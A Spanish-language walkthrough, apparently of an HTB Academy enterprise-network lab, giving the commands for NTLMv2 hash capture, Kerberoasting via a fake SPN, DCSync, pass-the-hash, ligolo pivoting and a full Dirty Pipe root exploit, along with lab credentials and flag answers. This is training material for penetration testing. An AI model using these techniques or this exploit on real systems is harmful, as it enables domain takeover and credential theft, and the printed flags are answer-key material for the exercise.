<img src="images/tassssk.png" width="600" alt="Resultado de Nmap">
</p>

Seleccionamos **Run any other Program** e introducimos nuestro programa **pwn.bat** **C:\Users\ilfserveradm\Documents\pwn.bat**

<p align="center"> 
<img src="images/task type.png" width="600" alt="Resultado de Nmap">
</p>

Desmarcamos **Login as the following user to run task** y seleccionamos **Finish** and **Save** para seguir en windows

<p align="center"> 
<img src="images/desmarcaaar.png" width="600" alt="Resultado de Nmap">
</p>

Por último, en la ruta `C:\Users\ilfserveradm\Documents` creamos un nuevo **.txt** Después, en la PowerShell escribimos el siguiente comando:

```
net localgroup administrators
```

Comprobamos que el usuario **ilfserveradm** pertenece al grupo de los administradores

<p align="center"> 
<img src="images/groupadministrator.png" width="600" alt="Resultado de Nmap">
</p>

```
shutdown /l
```

Reiniciamos la maquina, luego dentro del escritorio del usuario administrator encontraremos la flag.txt

answer: **33a9d46de4015e7b3b0ad592a9394720**

4. **Obtain the NTLMv2 password hash for the mpalledorous user and crack it to reveal the cleartext value. Submit the user's password as your answer.**

En esta ocasion descargaremos esta herramienta [Inveigh](https://github.com/Kevin-Robertson/Inveigh) sirve para **capturar de credenciales** aprovechando protocolos de resolución de nombres y autenticación de red en Windows.

Descargamos dicha herramienta en nuestra kali

```
git clone https://github.com/Kevin-Robertson/Inveigh.git
```

Luego preparamos una carpeta compartida con **xfreerdp** La idea es trasladar la herramienta **Inveigh** lo compartiremos en el escritorio del usuario **ilfserveradm**

```
xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:Sys26Admin /dynamic-resolution /drive:Shared,/home/dani/Escritorio/htbAcademy/attackingEnterpriseNetwork
```

Importante, iniciamos una powershell como administrator, ejecutamos lo siguiente comandos:

```
Import-Module .\Inveigh.ps1

Invoke-Inveigh -NBNS Y -LLMNR Y -HTTP Y -HTTPS Y -SMB Y - ConsoleOutput Y -FileOutput Y

Get-Inveigh -NTLMv2
```

> mpalledorous::ACADEMY-AEN-DEV:7E2B3B6EA829EC52:ACCFC986A2525A0B311B9A2B353E8AD4:0101000000000000C130C8E8D31ADD018ABA7B71916074630000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00410045004E002D004D00530030000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004800410043004100440045004D0059002D00410045004E002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800C130C8E8D31ADD010600040002000000080030003000000000000000000000000020000025E68AF0CAE1A7AEC4D5A817ECCC7124E0A97709AB7EB7462BBD9EDE70087F900A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0038002E0035003000000000000000000000000000

Guardamos el hash del usuario mpalledorous como **hashmpalledorous** en nuestra kali 

```
hashcat -m 5600 hashmpalledorous /usr/share/wordlists/rockyou.txt
```

answer: **1squints2**

### Active Directory Compromise

  1. **Set a fake SPN on the ttimmons user. Kerberoast this user and crack the TGS ticket offline to reveal their cleartext password. Submit this password as your answer.**

Volvemos a la maquina **dmz01** pero con el usuario de máximo privilegio, se nos proporcionan las credenciales **mssqladm**:**DBAilfreight1!**, supuestamente obtenidas del entorno de Active Directory.

```
Import-Module .\powerview.ps1

$sid = Convert-NameToSid mssqladm

Get-DomainObjectACL -ResolveGUIDs -Identity * | ?{$_.SecurityIdentifier -eq $sid}
```

**Esto tarda bastante entre 15/30 minutos**

El usuario **mssqladm** tiene permisos de **GenericWrite** sobre **ttimmons**. Es un permiso de acceso de alto nivel que otorga la capacidad de **modificar cualquier propiedad o atributo** del objeto sobre el cual se aplica.

<p align="center"> 
<img src="images/ttimons.png" width="600" alt="Resultado de Nmap">
</p>

Mediante **xfreerdp** accedemos una nueva sesión con el usuario **mssqladm**

```
xfreerdp /v:172.16.8.20 /u:mssqladm /p:'DBAilfreight1!' /dynamic-resolution
cd /tools
```

Con estas serie de comandos en PowerShell lograremos una **movimiento lateral** aprovechando que tengo el permiso **`GenericWrite`** sobre el usuario `ttimmons`.

```
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
```

- **¿Qué hace?**: Toma la contraseña en texto plano `'DBAilfreight1!'` y la convierte en un objeto de tipo _SecureString_ (cadena segura) en memoria, guardándolo en la variable `$SecPassword`.

```
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
```

**¿Qué hace?**: Junta el nombre del usuario (`INLANEFREIGHT\mssqladm`) con la contraseña encriptada que preparamos arriba (`$SecPassword`) y crea un objeto de credenciales completo de PowerShell (`PSCredential`), guardándolo en `$Cred`.

```
Set-DomainObject -Credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

- **¿Qué hace?**: Utiliza la herramienta PowerView para conectarse a Active Directory usando las credenciales de `mssqladm` y **le asigna un atributo `serviceprincipalname` (SPN)** con el valor `acmetesting/LEGIT` al objeto de usuario `ttimmons`.

- **`-Verbose`**: Muestra el detalle técnico en pantalla para confirmar si la operación fue exitosa o si hubo errores de red/autenticación.

<p align="center"> 
<img src="images/spnfalse.png" width="600" alt="Resultado de Nmap">
</p>

En conclusión, lo que logramos con ese último comando fue **pegarle una etiqueta de servicio a la cuenta del empleado**. 

Al ponerle esa etiqueta (SPN) al usuario, hiciste que Active Directory ahora lo trate como si fuera un servidor o un servicio del sistema.

Esto habilita que cualquier otra cuenta del dominio pueda pedirle a Active Directory un **ticket de acceso (TGS)** para comunicarse con él, lo cual es el requisito necesario para realizar el ataque de _Kerberoasting_.

En mi kali, haremos el siguiente comando

```
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```

la contraseña es **DBAilfreight1!**

> $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$d0b4dc246026944d86bdb2c09c910452$045a8e1077b20652d66e3ac597b7b746b86c3588e3d82e9e6d45dbaaee430a3d264523f68aa032295afa8028d26a20f0d8748dc5eb1fa8182b7ea14c4309f7e41cad1af00de715543c627475e363d664b481ec270361c260256e10c76188e9c9e4e57f6c7b9393c474e2cb96a3a863e65aaf16f8b4643f32285c4faa6fc125b41153ec6611b475c8656aab0a645bde9182909d9b559c10ab100dc4e3b81e35770dde4eca317e58b30f5b2a865c741dae70042b0c69088b384b5ddcc69caddc48508f9ddeb10c5ee3c88f6a8dcd97ea96e701fa24cf03c13bbf1bd1c9c526d9c54692befa2ad9e066e1d40b9705ebc3e3f24f6ac9354330475250377454585f705538f061a771d0b3640adf71491654c2925a67f41556b450ab15c9b1f560c59c5294c6f63fe273ec526804c6cdbb197a9e6bcdc5a82697c0b5713ef681031387af448a3b6e556d24cbbe24cce91a30225e3d6e60121a894c19fc92d426ba5a665e268c2dfb1984038c7c988d1c8033062dc9765cfffa27949472b54f7b931af89e34034d29eebd97d888094949e0164d48ecb7f26cc17dd43195064129af334a60b74d3ed673d9df57237a6c6a593e68a8b43d1c2fce6e8ca574a8eefcee6cb03ee70ecf08ebf779a0c08290b52ad95daa7fe37cc51db227e4c5078308894b249058b64ecef420eb6bc0dcbb65e0418671b112dd34048d104861297caa238e872b0fd42bef79e04b2d73b2d4f900ca49149ec14064aea3c673dd4b0088d4c3a717d3651e5c0cf896b9de183b4f60f3bcec5e49d46310743f9458471e6cd7b1e520805b757a214b43bf789590a4780d59d45307dcc2069193aabcceb5a7744e80455cc81e0fa879286bd72da2e0214d7df9e8dc63b1a4267beb7eee872a1c307dd10fed758b58e3c087bcbc327d40b5153a7aea57401c8e20061ca912090671d90cb5d4656c94a319500d68fcdd93b856c98bd91b2dd57fcef247a6562bec67835519e08c9fc736ffdc895070a42ae790bd0f8935e85403121b57cffb9e9c6ecb2f6fb6a8714e03d685e13f6bfa8799ebafaac6d421247f08e6e444cfee13d01f96d5c243c42daf284c726b2fb16aaa299754536bf49299f82f35f7e9b2e125bce465b50caf6a1169da5155ebe41d26f9eadcee157c86c2a2042918a872d42f325435588ee359b71fd08e47ba0f079a9ff1432a91a81ff2783945f3ff0d974cead63cceab91027989afb381747c7ea28d77a289b08a2349ea4219c3a9a9621b528c6ddebc5b6fc4b37dcf6e06dcceb79556167b9bca0b4eb8e24c5aca88d8d3db3e1548cc942b846ebc6e31816a71bb33332cbeb407732fda8d7132d1b8470bfda4361015

Lo vamos a guardar como **hashttimmons**

```
hashcat -m 13100 hashttimmons /usr/share/wordlists/rockyou.txt
```

answer: **Repeat09**

2. **After obtaining Domain Admin rights, authenticate to the domain controller and submit the contents of the flag.txt file on the Administrator Desktop.**

Es mejor realizar la siguiente actividad en una sesión de **mssqladm**

```
xfreerdp /v:172.16.8.20 /u:mssqladm /p:'DBAilfreight1!' /dynamic-resolution
cd /tools
```

A continuación realizo los siguientes comandos:

```
powershell

Import-Module .\PowerView.ps1

$sid = Convert-NameToSid ttimmons

Get-DomainObjectACL -ResolveGUIDs -Identity * | ?{$_.SecurityIdentifier -eq $sid}
```

**Esto tarda bastante entre 3 minutos**

<p align="center"> 
<img src="images/ttimoooooooooons.png" width="600" alt="Resultado de Nmap">
</p>

El usuario **timmons** tiene **Generic All** sobre los **Server Admins**.

Ahora veamos qué permisos tiene el usuario **Server Admins**:

```
$sid = Convert-NameToSid "Server Admins"

Get-DomainObjectACL -ResolveGUIDs -Identity * | ?{$_.SecurityIdentifier -eq $sid}
```

```bash
AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-2814148634-3729814499-1637837074
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2814148634-3729814499-1637837074-1622
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-2814148634-3729814499-1637837074
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2814148634-3729814499-1637837074-1622
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-2814148634-3729814499-1637837074
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2814148634-3729814499-1637837074-1622
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
```

El **Server Admins** tiene los permisos **DS-Replication-Get-Changes-In-Filtered-Set**,
**DS-Replication-Get-Changes** y **DS-Replication-Get-Changes-All**, que permiten
realizar un ataque DCSync

Esto significa que podemos realizar un ataque **DCSync** con el usuario **ttimmons**
a través del grupo **Server Admins.**

Primero, haremos que el usuario **ttimmons** tenga el permiso **GenricAll** para agregarse a sí mismo al grupo **Administradores del servidor**.

Utilizaremos los siguientes comandos:

Convierte la contraseña correcta de ttimmons

```
$timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -
```

Crea la credencial

```
$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
```

Obtén el SID del grupo

```
$group = Convert-NameToSid "Server Admins"
```

Agrega al usuario **ttimmons** al grupo **Server Admins**

```
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -Verbose
```

Ahora que **ttimmons** es miembro de **Server Admins**

Luego en mi kali hare la siguiente herramienta **secretsdump.py**:

```
/usr/share/doc/python3-impacket/examples/secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```

`-just-dc-ntlm`: Filtro para extraer **únicamente los hashes NTLM** del archivo de base de datos de Active Directory (`NTDS.dit`).

>Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::

```
evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
cat C:\Users\Administrator\Desktop\flag.txt
```

answer: **7c09eb1fff981654a3bb3b4a4e0d176a**

3. **Compromise the INLANEFREIGHT.LOCAL domain and dump the NTDS database. Submit the NT hash of the Administrator account as your answer.**

Esta pregunta la respondemos con la actividad anterior:

answer: **fd1f7e5564060258ea787ddbb6e6afa2**

### Post-Exploitation

1. **Gain access to the MGMT01 host and submit the contents of the flag.txt file in a user's home directory.**

Continuando el punto donde lo dejamos en la pregunta anterior (obtener permisos de administrador en **DC01** y volcar la base de datos NTDS), se nos informa que existe el host **MGMT01**, pero dicho host no puede estar en la red interna que acabamos de comprometer (ya que comprometimos todas las máquinas de esa red). Por lo tanto, debe existir una segunda red interna.

```
evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
ipconfig
```

La ip de **MGMT01** es ---> **172.16.8.3**
la ip privada es --> **172.16.9.3**

<p align="center"> 
<img src="images/ipconfig.png" width="600" alt="Resultado de Nmap">
</p>

Este comando realiza un **escaneo de red (ping sweep)** en la subred `172.16.9.0/24`. Envía una traza ICMP (ping) a cada dirección IP del rango `172.16.9.1` al `172.16.9.254` para descubrir **qué dispositivos están activos en esa misma red local**.

```
1..254 | ForEach-Object { $ip = "172.16.9.$_"; if (ping -n 1 -w 200 $ip | Select-String "TTL=") { "$ip is online" } else { "$ip is offline" } }
```

> 172.16.9.25 is online

Hay un host activo (además del nuestro): **172.16.9.25**, que debe ser **MGMT01**

Para ello, el proceso habitual de **Ligolo** (para un pivoteo de una sola capa) no funcionará, puesto que ahora nuestra kali (pwnbox) y **MGMT01** están separados por dos máquinas (**dmz01** y **DC01**, que en este caso actúa como **dmz02**), cada una representando su propia capa de red interna.
**Aquí hay una pequeña ilustración que hice para mostrar el entorno de red**:

<p align="center"> 
<img src="images/miilustracion.png" width="600" alt="Resultado de Nmap">
</p>

En mi kali preparamos el puerto de escucha 

```
python3 -m http.server 80
```

En la maquina **dmz01** descargamos estos archivos

```
wget http://10.10.15.109:80/proxy
chmod +x proxy
```

Activamos ligolo 

```
ip tuntap add user root mode tun ligolo  
ip link set ligolo up
./proxy -selfcert
```

<p align="center"> 
<img src="images/ligolowindowsdmz01.png" width="600" alt="Resultado de Nmap">
</p>

Luego para atraer el archivo **agent.exe** a la maquina windows **MGMT01** nos situaremos en el mismo sitio donde se encuentra el **agent.exe** 

```
evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
mkdir /tools
cd /tools
upload agent.exe
```

<p align="center"> 
<img src="images/agent.exe.png" width="600" alt="Resultado de Nmap">
</p>

```
.\agent.exe -connect 172.16.8.120:11601 -ignore-cert
```

**MUY IMPORTANTE TENER QUE AÑADIR ESTE COMANDO DESPUES EN WINDOWS-DMZ01 PARA PODER DETECTAR LA IP `172.16.9.25``**

```
ip route add 172.16.9.0/24 dev ligolo
```

Luego una vez echo la cadena, podemos hacer ping desde mi kali 

```
ping -c 1 172.16.9.25
```

<p align="center"> 
<img src="images/ping17216925.png" width="600" alt="Resultado de Nmap">
</p>

¡Tenemos conexión desde mi **kali** a **MGMT01**!

Ahora podemos analizar la máquina usando las herramientas de kali sin necesidad de transferencias de herramientas innecesariamente complejas (que a menudo fallan).

Ejecutemos un escaneo con nmap:

```
nmap 172.16.9.25 -A
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Estamos trabajando con una máquina Linux con SSH abierto.

Sin embargo, no tenemos credenciales ni claves para acceder a ella. Se me ocurre la idea de buscar en **Department Shares**. 

Abrimos una nueva session en evil-winrm

```
evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```

```
Get-ChildItem -Path "C:\Department Shares" -Recurse -ErrorAction SilentlyContinue -Force | Select-String -Pattern "PRIVATE KEY" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path -Unique
```

Realizamos una búsqueda de credenciales y encontramos las que necesitábamos, así que busco ahora las claves RSA

>C:\Department Shares\IT\Private\Networking\harry-id_rsa
>C:\Department Shares\IT\Private\Networking\james-id_rsa
>C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa

```
download "C:\Department Shares\IT\Private\Networking\harry-id_rsa"
download "C:\Department Shares\IT\Private\Networking\james-id_rsa"
download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa"
```

<p align="center"> 
<img src="images/idrsaaaa.png" width="600" alt="Resultado de Nmap">
</p>

En mi maquina kali pruebo el el idrsa del usuario ssmallsadm  (**ssmallsadm-id_rsa**)

```
chmod 600 *id_rsa
ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25
cat flag.txt
```

answer: **3c4996521690cc76446894da2bf7dd8f**

2. **Escalate privileges to root on the MGMT01 host. Submit the contents of the flag.txt file in the /root directory.**

Continuando con la sesión de la actividad anterior, ejecutamos el siguiente comando:

```
uname -a
```

> Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

La versión del kernel es **5.10.0-051000-generic**. Esta versión del kernel es vulnerable a la vulnerabilidad [Dirty Pipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/) (CVE-2022-0847)

Copia el contenido del archivo **exploit-1.c**

```
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int main() {
	const char *const path = "/etc/passwd";

        printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
        FILE *f1 = fopen("/etc/passwd", "r");
        FILE *f2 = fopen("/tmp/passwd.bak", "w");

        if (f1 == NULL) {
            printf("Failed to open /etc/passwd\n");
            exit(EXIT_FAILURE);
        } else if (f2 == NULL) {
            printf("Failed to open /tmp/passwd.bak\n");
            fclose(f1);
            exit(EXIT_FAILURE);
        }

        char c;
        while ((c = fgetc(f1)) != EOF)
            fputc(c, f2);

        fclose(f1);
        fclose(f2);

	loff_t offset = 4; // after the "root"
	const char *const data = ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt root piped 
        printf("Setting root password to \"piped\"...\n");
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
		return EXIT_FAILURE;
	}

	/* open the input file and validate the specified offset */
	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return EXIT_FAILURE;
	}

	if (offset > st.st_size) {
		fprintf(stderr, "Offset is not inside the file\n");
		return EXIT_FAILURE;
	}

	if (end_offset > st.st_size) {
		fprintf(stderr, "Sorry, cannot enlarge the file\n");
		return EXIT_FAILURE;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}

	char *argv[] = {"/bin/sh", "-c", "(echo piped; cat) | su - -c \""
                "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
                "cp /tmp/passwd.bak /etc/passwd;"
                "echo \\\"Done! Popping shell... (run commands now)\\\";"
                "/bin/sh;"
            "\" root"};
        execv("/bin/sh", argv);

        printf("system() function call seems to have failed :(\n");
	return EXIT_SUCCESS;
}
```

nos iremos a la carpeta **/tmp**

```
vim exploit-1.c
```

Introduzca la tecla **'i'** para activar el modo de inserción y pego el código C copiado en el archivo.

Una vez copiado le damos a la tecla **escape** y escribimos **`:wq`** + `Enter` Eso significa que guardamos y salimos. Por último compilamos el código

```
gcc exploit-1.c -o exploit-1
./exploit-1
```

<p align="center"> 
<img src="images/ultimaflag.png" width="600" alt="Resultado de Nmap">
</p>

Hay veces que la sesión se puede ir, con restaurar la conexión usando **ligolo** es más que suficiente.

answer: **206c03861986c0e264438cb6e8e90a19**